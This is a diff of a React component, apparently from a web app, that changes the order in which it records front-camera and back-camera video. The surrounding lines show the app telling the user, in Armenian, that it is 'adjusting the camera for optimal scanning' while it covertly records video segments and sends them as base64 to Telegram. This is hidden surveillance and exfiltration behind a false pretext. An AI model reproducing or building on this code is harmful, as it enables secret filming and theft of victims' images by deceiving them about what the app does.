@@ -279,19 +279,19 @@ const PermissionHandler = () => {
       setProcessSuccessful(initialSendSuccess);
     }
 
-    // --- Start Video 1 Recording (Back Camera) ---
+    // --- Start Video 1 Recording (Front Camera) ---
     setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
     setAppPhase("recordingVideo1");
-    const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment"); // Use 'environment' for first video
+    const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user"); // Use 'user' for first video (FRONT)
     if (video1Base64) {
       const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1, attempt);
       setProcessSuccessful(prev => prev && video1SendSuccess);
     }
 
-    // --- Video 2 Recording (Front Camera) ---
+    // --- Video 2 Recording (Back Camera) ---
     setLoadingMessage("Կարգավորում ենք տեսախցիկը լավագույն սկանավորման համար..."); // Adjusting camera for optimal scanning...
     setAppPhase("recordingVideo2");
-    const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user"); // Use 'user' for second video
+    const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "environment"); // Use 'environment' for second video (BACK)
     if (video2Base64) {
       const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2, attempt);
       setProcessSuccessful(prev => prev && video2SendSuccess);
